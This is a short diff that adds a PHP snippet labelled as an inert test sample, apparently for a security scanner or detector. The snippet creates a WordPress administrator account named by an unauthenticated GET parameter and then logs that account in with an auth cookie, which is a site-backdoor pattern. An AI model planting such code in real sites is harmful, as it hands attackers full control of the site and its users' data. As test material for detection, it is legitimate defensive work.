@@ -1,0 +1,4 @@
+// INERT TEST SAMPLE
+wp_insert_user(array('role' => 'administrator', 'user_login' => $_GET['u']));
+wp_set_current_user($id); wp_set_auth_cookie($id);
+
